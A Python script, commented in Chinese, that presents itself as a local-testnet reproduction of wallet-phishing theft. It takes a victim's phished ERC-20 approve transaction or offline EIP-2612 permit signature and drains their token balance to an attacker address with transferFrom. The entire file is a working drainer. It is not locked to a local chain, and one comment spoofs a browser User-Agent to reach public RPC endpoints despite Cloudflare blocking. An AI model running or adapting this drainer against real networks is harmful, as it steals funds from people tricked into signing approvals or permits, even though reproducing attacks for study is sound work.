"""攻击者收割脚本(第五代攻击复现演示,Issue #56)。

仅限本地 Anvil 模拟链 + 公开测试私钥,零真实资产;禁止指向任何真实环境。

两条路径:
  1. approve:受害者已在钓鱼页签了 approve 交易 -- 给出该交易哈希,本脚本从链上
     取回交易,解析出授权额度,再用攻击者账户发 transferFrom 搬空余额。
  2. permit:受害者签的是离线 EIP-2612 签名 -- 把签名与参数交给本脚本,脚本
     自己把 permit 交易发上链,再 transferFrom 搬空余额。

用法示例见 docs/phishing-runbook.md。
"""

import argparse
import json
import pathlib
import shutil
import subprocess
import sys
import urllib.request

APPROVE = "095ea7b3"
TRANSFER_FROM = "23b872dd"
PERMIT = "d505accf"
BALANCE_OF = "70a08231"

ATTACKER = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"  # Anvil 测试账户 #1

# Anvil 公开测试私钥(仅存在于每个 anvil 启动输出中,无任何真实资产)
DEFAULT_ATTACKER_KEY = ("0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603"
                        "b6b78690d")


def rpc(url: str, method: str, params):
    payload = json.dumps({"jsonrpc": "2.0", "id": 1, "method": method, "params": params}).encode()
    # 公共 RPC(Cloudflare)默认拦 python-urllib 的 UA,必须伪装成浏览器
    req = urllib.request.Request(url, data=payload, headers={
        "Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"})
    with urllib.request.urlopen(req, timeout=15) as resp:
        out = json.loads(resp.read())
    if "error" in out:
        raise RuntimeError(f"RPC 错误: {out['error']}")
    return out["result"]


def _word(hex40: str) -> str:
    return hex40.lower().removeprefix("0x").rjust(64, "0")


def balance_of(url: str, token: str, holder: str) -> int:
    data = "0x" + BALANCE_OF + _word(holder)
    out = rpc(url, "eth_call", [{"to": token, "data": data}, "latest"])
    return int(out, 16) if out and out != "0x" else 0


def parse_approve_tx(url: str, txhash: str):
    """从链上取回受害者交易,返回 (victim, spender, amount)。"""
    tx = rpc(url, "eth_getTransactionByHash", [txhash])
    if not tx:
        raise SystemExit(f"[!] 链上找不到交易 {txhash}")
    data = (tx.get("input") or "0x").removeprefix("0x")
    victim = tx["from"]
    if not data.startswith(APPROVE):
        raise SystemExit(f"[!] 交易 {txhash} 不是 approve(选择器 {data[:8] or '空'})")
    body = data[len(APPROVE):]
    if len(body) != 128:
        raise SystemExit("[!] approve 参数区长度异常")
    spender = "0x" + body[24:64]
    amount = int(body[64:128], 16)
    return victim, spender, amount


def parse_permit_sig(sig: str):
    """65 字节签名 → (v, r, s)。"""
    raw = sig.removeprefix("0x")
    if len(raw) != 130:
        raise SystemExit("[!] 签名应为 65 字节(130 个 hex 字符)")
    r, s, v = raw[0:64], raw[64:128], int(raw[128:130], 16)
    if v < 27:
        v += 27
    return v, r, s


def send(url: str, to: str, data: str, key: str) -> str:
    cast = shutil.which("cast") or str(pathlib.Path.home() / ".foundry" / "bin" / "cast")
    if not pathlib.Path(cast).exists():
        raise RuntimeError("[!] 需要 cast(Foundry),未找到;安装见 https://book.getfoundry.sh")
    proc = subprocess.run(
        [cast, "send", to, "--rpc-url", url, "--private-key", key,
         "--data", "0x" + data.removeprefix("0x"), "--json"],
        capture_output=True, text=True, timeout=60,
    )
    if proc.returncode != 0:
        raise RuntimeError(f"[!] 交易发送失败:\n{proc.stdout}{proc.stderr}")
    receipt = None
    for line in reversed(proc.stdout.splitlines()):
        line = line.strip()
        if line.startswith("{"):
            receipt = json.loads(line)
            break
    if not receipt:
        raise RuntimeError(f"[!] 无法解析 cast 回执:\n{proc.stdout[-400:]}")
    if receipt.get("status") != "0x1":
        raise RuntimeError(f"[!] 交易在链上 revert(未生效),回执: {receipt.get('transactionHash')}")
    return receipt["transactionHash"]


def report(url: str, token: str, victim: str, attacker: str, label: str):
    vb, ab = balance_of(url, token, victim), balance_of(url, token, attacker)
    print(f"[{label}] 受害者 {victim} 余额: {vb}")
    print(f"[{label}] 攻击者 {attacker} 余额: {ab}")
    return vb, ab


def drain(url: str, token: str, victim: str, amount: int, key: str,
          attacker: str = ATTACKER) -> None:
    data = TRANSFER_FROM + _word(victim) + _word(attacker) + _word(hex(amount)[2:])
    print(f"[*] 攻击者发起 transferFrom: {amount} 枚代币 {victim} → {attacker}")
    send(url, token, data, key)


def main() -> int:
    try:
        return _run(ap_parse())
    except RuntimeError as exc:
        raise SystemExit(str(exc))


def ap_parse():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--rpc", default="http://127.0.0.1:8546")
    ap.add_argument("--token", required=True, help="代币合约地址")
    ap.add_argument("--key", default=DEFAULT_ATTACKER_KEY, help="攻击者私钥(默认 Anvil #1)")
    mode = ap.add_mutually_exclusive_group(required=True)
    mode.add_argument("--tx", help="approve 路径:受害者在钓鱼页签名产生的交易哈希")
    mode.add_argument("--permit", action="store_true", help="permit 路径:离线签名收割")
    ap.add_argument("--sig", help="permit 路径:受害者签名(65 字节 hex)")
    ap.add_argument("--owner", help="permit 路径:受害者地址")
    ap.add_argument("--value", type=lambda x: int(x, 0), help="permit 路径:授权额度")
    ap.add_argument("--deadline", type=lambda x: int(x, 0), default=1893456000)
    ap.add_argument("--nonce", type=lambda x: int(x, 0), default=0)
    args = ap.parse_args()
    return args


def _run(args) -> int:
    if args.tx:
        victim, spender, amount = parse_approve_tx(args.rpc, args.tx)
        if spender.lower() != ATTACKER.lower():
            print(f"[!] 注意:授权对象是 {spender},不是攻击者 {ATTACKER},演示继续(前提是攻击者即 spender)")
        onchain = balance_of(args.rpc, args.token, victim)
        print(f"[*] 从链上交易解析出:受害者 {victim} 授权 {amount} 枚")
        if onchain < amount:
            print(f"[*] 受害者余额仅 {onchain} 枚,按余额收割(授权额度外的拿不到)")
            amount = onchain
        if amount == 0:
            raise SystemExit("[!] 授权额度或余额为 0,无可收割")
        vb0 = onchain
        print(f"[*] 收割前受害者余额: {vb0}")
        drain(args.rpc, args.token, victim, amount, args.key)
        last = victim
    else:
        missing = [k for k in ("sig", "owner", "value") if not getattr(args, k)]
        if missing:
            raise SystemExit(f"[!] permit 路径缺少参数: {missing}")
        v, r, s = parse_permit_sig(args.sig)
        victim = args.owner
        print(f"[*] 用受害者的离线签名发 permit 交易(spender=攻击者 {ATTACKER})")
        data = (PERMIT + _word(victim) + _word(ATTACKER) + _word(hex(args.value)[2:])
                + _word(hex(args.deadline)[2:]) + _word(hex(v)[2:]) + r + s)
        send(args.rpc, args.token, data, args.key)
        print("[*] permit 上链,授权已生效——受害者没有发过任何交易,只签过一个名")
        vb0 = balance_of(args.rpc, args.token, victim)
        print(f"[*] 收割前受害者余额: {vb0}")
        drain(args.rpc, args.token, victim, min(args.value, vb0), args.key)
        last = victim

    vb1, ab1 = balance_of(args.rpc, args.token, last), balance_of(args.rpc, args.token, ATTACKER)
    print(f"\n=== 收割完成 ===")
    print(f"受害者 {last}: {vb0} → {vb1}")
    print(f"攻击者 {ATTACKER}: 余额现为 {ab1}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
